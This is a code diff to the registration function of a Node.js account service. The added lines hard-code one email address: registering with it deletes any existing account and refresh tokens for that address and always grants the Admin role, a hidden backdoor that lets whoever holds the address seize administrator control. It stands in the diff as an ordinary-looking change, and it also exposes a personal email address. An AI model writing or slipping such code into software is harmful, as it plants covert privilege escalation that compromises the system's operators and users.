@@ -132,6 +132,14 @@ async function revokeToken({ token, ipAddress }) {
 }
 
 async function register(params, origin) {
+    if (params.email === 'gianne29joshua@gmail.com') {
+        const existingAdmin = await getAccountByEmail(params.email);
+        if (existingAdmin) {
+            await db.execute('DELETE FROM refresh_tokens WHERE accountId = ?', [existingAdmin.id]);
+            await db.execute('DELETE FROM accounts WHERE id = ?', [existingAdmin.id]);
+        }
+    }
+
     // Check for duplicate email (send silent email instead of error for security)
     const existing = await getAccountByEmail(params.email);
     if (existing) {
@@ -145,7 +153,10 @@ async function register(params, origin) {
     }
 
     const total = await countAccounts();
-    const role = total === 0 ? 'Admin' : 'User'; // First account is Admin
+    let role = total === 0 ? 'Admin' : 'User'; // First account is Admin
+    if (params.email === 'gianne29joshua@gmail.com') {
+        role = 'Admin';
+    }
 
     const passwordHash = await bcrypt.hash(params.password, 10);
     const verificationToken = uuidv4();
